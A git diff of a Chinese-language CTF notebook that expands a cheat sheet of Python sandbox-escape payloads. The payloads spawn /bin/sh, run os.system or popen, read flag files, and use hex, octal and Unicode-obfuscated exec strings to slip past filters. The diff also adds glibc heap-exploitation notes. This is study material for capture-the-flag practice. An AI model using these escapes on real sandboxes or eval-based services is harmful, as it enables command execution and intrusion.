@@ -298,7 +298,6 @@ int main() {
 37. 利用risc-v虚拟机任意地址读写漏洞执行rop链。例题:[CS2100](../../CTF/HackTM%20CTF/Pwn/CS2100.md)
 38. 在python2中，input()函数等同于eval(raw_input())，意味着它会读取合法的python 表达式并执行，那么输入一个shell语句就能getshell了，例如`"__import__('os').system('cat flag.txt')"`。例题:[Balloons](https://github.com/ZorzalG/the-big-MHSCTF2023-writeups/blob/main/Balloons.md)
 39. [Pyjail](https://cheatsheet.haax.fr/linux-systems/programing-languages/python/)([python沙盒逃逸](https://www.cnblogs.com/h0cksr/p/16189741.html))。这类题型知识点比较杂，记录一点看过的，以后要用就翻。
-
 - `[*().__class__.__base__.__subclasses__()[50+50+37].__init__.__globals__.values()][47]([].__doc__[5+5+7::79])`
 > 利用\*符号将字典值转为列表，从而可使用\[\]取值+利用system函数和`__doc__`里的sh字符串getshell。例题:[Virus Attack](https://github.com/daffainfo/ctf-writeup/tree/main/ByteBanditsCTF%202023/Virus%20Attack)。类似的题目还有里面提到的[Albatross](https://okman.gitbook.io/okman-writeups/miscellaneous-challenges/redpwnctf-albatross)，不过这道题多了个unicode哥特字符也能执行函数的考点：
 
@@ -314,30 +313,39 @@ print函数可正常使用。
     - LOAD_GLOBAL, LOAD_NAME, LOAD_METHOD和LOAD_ATTR是常用的加载可调用对象的opcode。
     - IMPORT_FROM本质上还是LOAD_ATTR，只不过多了一层伪装。可以手工在使用LOAD_ATTR的地方将其改为IMPORT_FROM也不会有问题。
     - 在python 的bytecode中，两种调用函数的方式分别为LOAD_METHOD+CALL_METHOD和LOAD_ATTR+CALL_FUNCTION.
+- `().__class__.__bases__[0].__subclasses__()[124].get_data('.','flag.txt')`.这种是上个的变种，两者都可以在jail环境无builtins时使用
 - 假如环境带有gmpy2，注意gmpy2.__builtins__是含有eval的，因此可以构造任意命令。在builtins里取函数和构造命令还可以通过拼接的形式，如：
 
 ```python
 gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]('c_div'[1]+'c_div'[1]+'ai'[1]+'agm'[2]+'cmp'[2]+'cos'[1]+'erf'[1]+'cot'[2]+'c_div'[1]+'c_div'[1]+"("+"'"+'cos'[1]+'cos'[2]+"'"+")"+"."+'cmp'[2]+'cos'[1]+'cmp'[2]+'erf'[0]+'jn'[1]+"("+"'"+'cmp'[0]+'ai'[0]+'cot'[2]+" "+"/"+'erf'[2]+'lcm'[0]+'ai'[0]+'agm'[1]+"'"+")"+"."+'erf'[1]+'erf'[0]+'ai'[0]+'add'[1]+"("+")")
 ```
-- `print.__self__.__import__("os").system("cmd")`。绕过滤版本：`print.__self__.getattr(print.__self__.getattr(print.__self__, print.__self__.chr(95) + print.__self__.chr(95) + print.__self__.chr(105) + print.__self__.chr(109) + print.__self__.chr(112) + print.__self__.chr(111) + print.__self__.chr(114) + print.__self__.chr(116) + print.__self__.chr(95) + print.__self__.chr(95))(print.__self__.chr(111) + print.__self__.chr(115)), print.__self__.chr(115) + print.__self__.chr(121) + print.__self__.chr(115) + print.__self__.chr(116) + print.__self__.chr(101) + print.__self__.chr(109))("cmd")`
-- 尝试读函数源码
-```py
-print(<func>.__code__) #获取文件名，func为文件内的函数名
-print(<fund>.__code__.co_names) #获取函数内调用的函数
-print(<func>.__code__.co_code) #函数的字节码
-print(<func>.__code__.co_consts) #函数内直接定义的常量
-print(<func>.__code__.co_varnames) #函数内定义的变量
-#https://github.com/HeroCTF/HeroCTF_v5/tree/main/Misc/pygulag ，内含字节码反编译脚本
-```
-- `print.__self__.__loader__.load_module('o''s').spawnv(0, "/bin/sh", ["i"])`
-- `print(print.__self__.__loader__().load_module('o' + 's').spawnvp(print.__self__.__loader__().load_module('o' + 's').P_WAIT, "/bin/sh", ["/bin/sh"]))`
-- `print(print.__self__.__loader__.load_module('bu''iltins').getattr(print.__self__.__loader__.load_module('o''s'),'sy''stem')('sh'))`
-- `print.__self__.setattr(print.__self__.credits, "_Printer__filenames", ["filename"]),print.__self__.credits()`,打印文件内容
-- `print(globals.__self__.__import__("os").system("cmd"))`
-- `print(().__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cmd').read())`
-- `print(''.__class__.__mro__[1].__subclasses__()[109].__init__.__globals__['sys'].modules['os'].__dict__['system']('cmd'))`
-- `print("".__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['system']('sh'))`
-- `print.__self__.__loader__.load_module('o''s').spawnl(0, "/bin/sh", "a")`
+- print相关
+  - `print.__self__.__import__("os").system("cmd")`。绕过滤版本：`print.__self__.getattr(print.__self__.getattr(print.__self__, print.__self__.chr(95) + print.__self__.chr(95) + print.__self__.chr(105) + print.__self__.chr(109) + print.__self__.chr(112) + print.__self__.chr(111) + print.__self__.chr(114) + print.__self__.chr(116) + print.__self__.chr(95) + print.__self__.chr(95))(print.__self__.chr(111) + print.__self__.chr(115)), print.__self__.chr(115) + print.__self__.chr(121) + print.__self__.chr(115) + print.__self__.chr(116) + print.__self__.chr(101) + print.__self__.chr(109))("cmd")`
+  - 尝试读函数源码
+  ```py
+  print(<func>.__code__) #获取文件名，func为文件内的函数名
+  print(<fund>.__code__.co_names) #获取函数内调用的函数
+  print(<func>.__code__.co_code) #函数的字节码
+  print(<func>.__code__.co_consts) #函数内直接定义的常量
+  print(<func>.__code__.co_varnames) #函数内定义的变量
+  #https://github.com/HeroCTF/HeroCTF_v5/tree/main/Misc/pygulag ，内含字节码反编译脚本
+  ```
+  - `print.__self__.__loader__.load_module('o''s').spawnv(0, "/bin/sh", ["i"])`
+  - `print(print.__self__.__loader__().load_module('o' + 's').spawnvp(print.__self__.__loader__().load_module('o' + 's').P_WAIT, "/bin/sh", ["/bin/sh"]))`
+  - `print(print.__self__.__loader__.load_module('bu''iltins').getattr(print.__self__.__loader__.load_module('o''s'),'sy''stem')('sh'))`
+  - `print.__self__.setattr(print.__self__.credits, "_Printer__filenames", ["filename"]),print.__self__.credits()`,打印文件内容
+  - `print(globals.__self__.__import__("os").system("cmd"))`
+  - `print(().__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cmd').read())`
+  - `print(''.__class__.__mro__[1].__subclasses__()[109].__init__.__globals__['sys'].modules['os'].__dict__['system']('cmd'))`
+  - `print("".__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['system']('sh'))`
+  - `print.__self__.__loader__.load_module('o''s').spawnl(0, "/bin/sh", "a")`
+- 关于`eval(payload)`中payload的控制
+  - 不使用26个字母中的前13个字母（使用10进制ascii绕过）：`exec("pr\x69nt(op\x65n('\x66'+\x63\x68r(108)+'\x61\x67.txt').r\x65\x61\x64())")`
+  - 不使用26个字母中的后13个字母（使用8进制）：`exec("\160\162i\156\164(\157\160e\156('flag.\164\170\164').\162ead())")`,`exec("\160\162\151\156\164\050\157\160\145\156\050\047\146\154\141\147\056\164\170\164\047\051\056\162\145\141\144\050\051\051")`，`\145\166\141\154\50\151\156\160\165\164\50\51\51`(`eval(input)`)
+  - 不使用任何数字或括号：`[[help['cat flag.txt'] for help.__class__.__getitem__ in [help['os'].system]] for help.__class__.__getitem__ in [__import__]]`(执行命令)，`[f"{help}" for help.__class__.__str__ in [breakpoint]]`(开启pdb)
+  - 使用斜体:`𝘦𝘷𝘢𝘭(𝘪𝘯𝘱𝘶𝘵())`,`𝘦𝘹𝘦𝘤("𝘢=𝘤𝘩𝘳;𝘣=𝘰𝘳𝘥;𝘤=𝘣('൬');𝘥=𝘢(𝘤-𝘣('೸'));𝘱𝘳𝘪𝘯𝘵(𝘰𝘱𝘦𝘯(𝘢(𝘤-𝘣('ആ'))+𝘢(𝘤-𝘣('ഀ'))+𝘢(𝘤-𝘣('ഋ'))+𝘢(𝘤-𝘣('അ'))+'.'+𝘥+𝘢(𝘤-𝘣('೴'))+𝘥).𝘳𝘦𝘢𝘥())")`
+  - 不使用`__`:`()._＿class_＿._＿bases_＿[0]._＿subclasses_＿()[124].get_data('.','flag.txt')`(第二个`＿`是unicode里面的下划线，python自动标准化成`_`)
+  - 使用特殊字体：`ｂｒｅａｋｐｏｉｎｔ()`（开启pdb）
 
 40. pwntools可以连接启用ssl/tls的远程服务器，只需给remote添加一个参数`ssl=True`。如：
 
@@ -588,7 +596,7 @@ private boolean checkBounds(Long index) {
   - 利用exit hook
   - 泄露environ变量后计算栈地址，将rop链写入栈
   - FSOP，参考解法：https://chovid99.github.io/posts/wanictf-2023/#copy--paste 。
-- glibc 2.35的加密fd字段（[safe linking](https://medium.com/@b3rm1nG/%E8%81%8A%E8%81%8Aglibc-2-32-malloc%E6%96%B0%E5%A2%9E%E7%9A%84%E4%BF%9D%E8%AD%B7%E6%A9%9F%E5%88%B6-safe-linking-9fb763466773)）。在高版本中的libc里，直接写fd字段无效，需要泄露heap基址后自行计算加密结果再写入。
+- glibc 2.35的加密fd字段（[safe linking](https://medium.com/@b3rm1nG/%E8%81%8A%E8%81%8Aglibc-2-32-malloc%E6%96%B0%E5%A2%9E%E7%9A%84%E4%BF%9D%E8%AD%B7%E6%A9%9F%E5%88%B6-safe-linking-9fb763466773)）。在高版本中的libc里，直接写fd字段无效，需要泄露heap基址（unsorted bin泄露出来的地址最常用）后自行计算加密结果再写入。
 ```python
 def demangle(val, is_heap_base=False):
     if not is_heap_base:
@@ -671,3 +679,29 @@ win=0x4014c6
 original=0x401090
 ```
 要把original改成win，格式化字符串偏移是7，使用`$hhn`写单字节。那么original地址处对应的是字节`0x90`，original+1处对应的是字节`0x10`，以此类推。然后写payload。payload一般像这样：`%numc%offset$hhn+addr`。offset表示addr的偏移，num是要写的字节。关键在于把加号的两部分分开，控制前半部分写的payload是程序的字长（32为4，64为8）。不到不要紧，用ljust往上取，将其patch到最近的字长的倍数。那么patch后的长度除以字长就是要加上的偏移了。如写`%34c%offset$hhn`,目前offset未知，但是根据现有的payload长度，这个offset加上一定不会超过16的长度。那就ljust补到16，addr的偏移是初始的7+16//8=9。`%34c%9$hhn+addr`
+74. [Gladiator](https://github.com/HeroCTF/HeroCTF_v5/tree/main/Pwn/Gladiator)
+- 多线程+uaf+glibc 2.35改got表+tcache poisoning
+```c
+// Create a thread, with a routine function
+int pthread_create(pthread_t *thread, const pthread_attr_t *attr, void *(*start_routine) (void *), void *arg);
+
+// To wait for a thread to be finished
+int pthread_join(pthread_t thread, void **retval);
+
+// Thread exit
+void pthread_exit (void * retval);
+
+// Stop a thread
+int pthread_cancel (pthread_t thread);
+
+// To lock access to a variable for the other threads, to avoid access problems
+int pthread_mutex_lock(pthread_mutex_t *mutex)
+int pthread_mutex_unlock(pthread_mutex_t *mutex)
+
+// To make a thread wait until a condition
+int pthread_cond_wait (pthread_cond_t * cond, pthread_mutex_t * mutex);
+//还有个pthread_cond_init，用于初始化一个pthread_cond_t类型的cond。wait等待的是A类型的cond，那么只有在接收到signal发出的A类型cond是才会继续执行。
+// To signal that the condition is met, which wakes up the thread(s)
+int pthread_cond_signal (pthread_cond_t * cond);
+```
+- 在不同线程malloc的chunk会有不同的arena。每个线程各自对应一个arena，各个arena之间由一个单向链表串起来。意味着不在main_arena里的unsorted bin chunk泄露出来的就不是main_arena的地址了。但是仍然可以通过当前arena泄露出来的地址加上动调得到的与main_arena的偏移，获取main_arena的地址，从而在当前thread中获取到main_arena里的chunk。因此在另外一个线程也能泄露libc基址，尝试用tcache poisoning等方法malloc到main_arena里的chunk即可
